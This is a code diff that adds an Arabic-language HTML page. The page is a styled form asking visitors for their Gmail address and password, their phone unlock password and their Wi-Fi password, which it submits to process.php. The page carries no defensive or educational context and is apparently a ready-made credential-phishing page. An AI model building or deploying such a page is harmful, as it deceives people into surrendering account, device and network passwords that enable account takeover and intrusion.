@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال بيانات Gmail والهاتف والإنترنت</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        input[type="text"], input[type="password"], input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+
+        input[type="submit"], button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #f44336;
+            margin-top: 10px;
+        }
+
+        input[type="submit"]:hover, button:hover {
+            background-color: #45a049;
+        }
+
+        button:hover {
+            background-color: #d32f2f;
+        }
+
+        .optional {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>إدخال بيانات Gmail والهاتف والإنترنت</h2>
+    <form action="process.php" method="POST">
+        <!-- خانة إدخال Gmail -->
+        <label for="gmail">أدخل Gmail</label>
+        <input type="text" id="gmail" name="gmail" placeholder="example@gmail.com" required>
+
+        <!-- خانة إدخال كلمة مرور Gmail -->
+        <label for="gmail-password">كلمة مرور Gmail</label>
+        <input type="password" id="gmail-password" name="gmail_password" placeholder="********" required>
+
+        <!-- خانة إدخال كلمة مرور الهاتف (اختيارية) -->
+        <label for="phone-password">كلمة مرور الهاتف </label>
+        <input type="number" id="phone-password" name="phone_password" placeholder="أدخل كلمة مرور الهاتف">
+
+        <!-- خانة إدخال كلمة مرور الإنترنت -->
+        <label for="wifi-password">كلمة مرور الإنترنت</label>
+        <input type="password" id="wifi-password" name="wifi_password" placeholder="********" required>
+
+        <!-- زر الإرسال -->
+        <input type="submit" value="إرسال البيانات">
+    </form>
+
+    <!-- زر في حال عدم وجود كلمة مرور للهاتف -->
+    <button onclick="skipPhonePassword()">لا يوجد كلمة مرور للهاتف</button>
+</div>
+
+<script>
+    function skipPhonePassword() {
+        document.getElementById('phone-password').value = ''; // إفراغ الحقل في حالة عدم وجود كلمة مرور
+    }
+</script>
+
+</body>
+</html>
